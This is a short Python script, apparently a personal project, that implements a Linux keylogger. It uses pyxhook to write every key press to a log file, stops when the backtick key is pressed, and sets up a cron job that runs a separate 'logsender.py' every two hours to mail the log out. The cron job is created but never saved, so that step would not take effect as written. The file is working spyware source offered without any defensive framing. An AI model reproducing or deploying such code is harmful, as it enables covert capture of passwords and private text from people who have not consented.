import pyxhook
from crontab import CronTab

logfile='/home/hritik/keylogger/key.log'
def OnkeyPress(event):
	f=open(logfile, 'a')
	f.write(event.Key)
	f.write('\n')
	if event.Ascii==96:
		f.close()
		new_hook.cancel()

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnkeyPress
new_hook.HookKeyboard()
new_hook.start()

#set a cron job to send the mail after 2 hour
cron = CronTab(user='hritik')
job1 = cron.new(command='python3 logsender.py')
job1.hour.every(2)
